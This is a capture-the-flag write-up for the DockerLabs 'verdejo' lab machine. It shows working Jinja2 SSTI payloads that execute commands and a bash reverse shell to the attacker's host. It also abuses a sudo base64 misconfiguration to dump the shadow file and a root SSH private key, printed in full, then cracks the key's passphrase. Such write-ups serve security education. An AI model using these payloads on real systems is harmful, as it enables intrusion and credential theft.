# verdejo

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| verdejo | The Hackers Labs | easy/facil | dockerlabs |

**Summary:** The verdejo machine combined a Jinja2 server side template injection on a Python Flask application with a GTFOBins sudo misconfiguration and an encrypted SSH key recovery. The port scan exposed SSH on port 22, Apache on port 80, and a Werkzeug development server on port 8089 serving a page titled "Dale duro bro". Directory enumeration on Apache found nothing actionable, so the focus moved to the Flask app. Submitting the payload `{{7*7}}` in the `user` parameter returned `Hola 49`, confirming a server side template injection vulnerability. The classic Python object traversal chain `self.__init__.__globals__.__builtins__.__import__('os').popen(...).read()` executed arbitrary commands as the user `verde`, first proving it with `id` and then firing a reverse shell to a netcat listener. After upgrading the TTY, `sudo -l` showed that `verde` could run `/usr/bin/base64` as root without a password. This primitive allowed reading arbitrary files with root privileges, so the full shadow file was dumped. Since the root password hash was locked, attention shifted to `/root/.ssh/id_rsa`, which was base64 decoded to recover the encrypted root SSH private key. The key was converted with `ssh2john` and cracked with John the Ripper against rockyou, yielding the passphrase `honda1`. Authenticating with the key and passphrase over SSH produced a root shell and completed the compromise.

---

## Reconnaissance

**1. Machine Deployment**

The engagement began by deploying the vulnerable machine using the DockerLabs automation script.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ sudo bash auto_deploy.sh verdejo.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                          
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Port Scan**

A full port scan was then conducted against the target to enumerate all running services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ nmap -sC -sV -p- -T4 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-07 20:25 +0700
Nmap scan report for 172.17.0.2 (172.17.0.2)
Host is up (0.000013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
|_  256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Dale duro bro
MAC Address: DE:CC:68:B7:69:D3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
```

The scan revealed three open services: OpenSSH on port 22, Apache HTTP on port 80 serving the default Debian page, and a Werkzeug development server on port 8089 serving a page titled "Dale duro bro".

**3. Directory Enumeration**

Directory brute-forcing was performed against the Apache web root.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ gobuster dir -u http://$ip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,zip,tar,env,bak,js,css,png
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,html,env,js,php,zip,tar,bak,css,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10701]
javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
server-status        (Status: 403) [Size: 275]
Progress: 2426127 / 2426127 (100.00%)
===============================================================
Finished
===============================================================
```

The Apache server held nothing of interest beyond the default page and a `javascript` directory. The Werkzeug application on port 8089 was the real target.

---

## Initial Access

**1. Server Side Template Injection Detection**

The Flask application echoes the value of the `user` parameter inside an HTML response. A classic template injection test payload was submitted.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ curl -s "http://172.17.0.2:8089/?user=%7B%7B7*7%7D%7D"

    <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
    
        <h1>Hola 49</h1>
        No hay nada aqui de verdad.<br>
        
    <br><p style="margin-top: 90px;">
```

The URL encoded payload `{{7*7}}` was rendered as `Hola 49`, which confirmed that the application evaluates Jinja2 expressions in the `user` parameter.

**2. Command Execution via SSTI**

The template injection was escalated to arbitrary command execution using the Python object traversal chain.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ curl -s "http://172.17.0.2:8089/?user=%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D"

    <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
    
        <h1>Hola uid=1000(verde) gid=1000(verde) groups=1000(verde)
</h1>
        No hay nada aqui de verdad.<br>
        
    <br><p style="margin-top: 90px;">
```

The chain `self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()` executed the `id` command, returning `uid=1000(verde)`, which proved code execution as the `verde` user.

**3. Reverse Shell**

A netcat listener was started on the attacking machine to catch the shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The same SSTI primitive was used to fire a bash reverse shell back to the listener.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ curl -s "http://172.17.0.2:8089/" --data-urlencode 'user={{ self.__init__.__globals__.__builtins__.__import__("os").popen("bash -c \"bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\"").read() }}' -G
```

**4. Catching the Shell and Upgrading the TTY**

The connection returned a shell as `verde`. Because the process lacked a TTY, the session was upgraded with a Python PTY and fully stabilised.

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 35542
bash: cannot set terminal process group (94): Inappropriate ioctl for device
bash: no job control in this shell
verde@e3fae2854b97:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
verde@e3fae2854b97:~$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                              
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

verde@e3fae2854b97:~$ export TERM=xterm && export SHELL=/bin/bash
verde@e3fae2854b97:~$ stty rows 80 cols 130
```

**5. Checking sudo Permissions**

The sudo rights of the `verde` user were inspected.

```bash
verde@e3fae2854b97:~$ sudo -l
Matching Defaults entries for verde on e3fae2854b97:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User verde may run the following commands on e3fae2854b97:
    (root) NOPASSWD: /usr/bin/base64
```

The `verde` account can run `/usr/bin/base64` as root without a password. Because `base64` is designed to read arbitrary files and print their contents, this behaves as a root file read primitive.

---

## Privilege Escalation

**1. Dumping the Shadow File**

The shadow file was read with root privileges by base64 encoding it and decoding the output locally.

```bash
verde@e3fae2854b97:~$ sudo -u root base64 /etc/shadow | base64 --decode
root:*:19856:0:99999:7:::
daemon:*:19856:0:99999:7:::
bin:*:19856:0:99999:7:::
sys:*:19856:0:99999:7:::
sync:*:19856:0:99999:7:::
games:*:19856:0:99999:7:::
man:*:19856:0:99999:7:::
lp:*:19856:0:99999:7:::
mail:*:19856:0:99999:7:::
news:*:19856:0:99999:7:::
uucp:*:19856:0:99999:7:::
proxy:*:19856:0:99999:7:::
www-data:*:19856:0:99999:7:::
backup:*:19856:0:99999:7:::
list:*:19856:0:99999:7:::
irc:*:19856:0:99999:7:::
_apt:*:19856:0:99999:7:::
nobody:*:19856:0:99999:7:::
systemd-network:!*:19864::::::
systemd-timesync:!*:19864::::::
messagebus:!:19864::::::
sshd:!:19864::::::
verde:$y$j9T$PaWEspPyUh1TjvyxpW/g70$Q10PVAPkYN321DGTV/xNdjI2HdiSnUTM5zEkxMlaG71:19864:0:99999:7:::
```

The root hash was locked with an asterisk, so password cracking was not possible. The root SSH private key was the next target.

**2. Recovering the Root SSH Key**

The root user's OpenSSH private key was read with the same technique.

```bash
verde@e3fae2854b97:~$ sudo -u root base64 /root/.ssh/id_rsa | base64 --decode
-----BEGIN OPENSSH PRIVATE KEY-----
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
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----
```

The private key was saved to a local file and given the correct permissions for use with OpenSSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ vim id_rsa   
                                                                                                                              
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ chmod 600 id_rsa  
```

**3. Cracking the Key Passphrase**

The encrypted key was converted into a hash format for John the Ripper and cracked against the rockyou wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ ssh2john id_rsa > id_rsa.hash   

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)     
1g 0:00:02:36 DONE (2026-08-07 20:52) 0.006374g/s 22.64p/s 22.64c/s 22.64C/s cougar..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

John recovered the passphrase `honda1` for the root SSH key.

**4. Root Shell**

The key and passphrase were used to authenticate as root over SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/verdejo]
└─$ ssh -i id_rsa root@$ip                                     
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:cXrO7XqFO9UAamN+NlSUwRb7nGL9Sve+scFB5YsLQG0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux e3fae2854b97 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 22 10:36:51 2024 from 172.17.0.1
root@e3fae2854b97:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
e3fae2854b97
```

A fully privileged root shell was achieved on the verdejo machine.

---

## Attack Chain Summary
1. **Reconnaissance**: A full TCP port scan with `nmap -sC -sV -p- -T4` identified OpenSSH on port 22, Apache on port 80, and a Werkzeug development server on port 8089 serving the page "Dale duro bro". Gobuster found nothing useful on Apache.
2. **Vulnerability Discovery**: The Flask application on port 8089 reflected the `user` parameter inside a Jinja2 template. Submitting `{{7*7}}` returned `Hola 49`, confirming a server side template injection.
3. **Exploitation**: The object traversal chain `self.__init__.__globals__.__builtins__.__import__('os').popen(...).read()` achieved arbitrary command execution as `verde`. An `id` payload proved it, and a bash reverse shell was then fired back to a netcat listener, which was upgraded to a full PTY.
4. **Internal Enumeration**: `sudo -l` showed that `verde` could run `/usr/bin/base64` as root without a password. This root file read primitive was used to dump `/etc/shadow`, where the root hash was locked, and to recover the encrypted `/root/.ssh/id_rsa`.
5. **Privilege Escalation**: The private key was converted with `ssh2john` and cracked with John the Ripper against rockyou, yielding the passphrase `honda1`. Authenticating with the key and passphrase over SSH produced a root shell and completed the compromise.
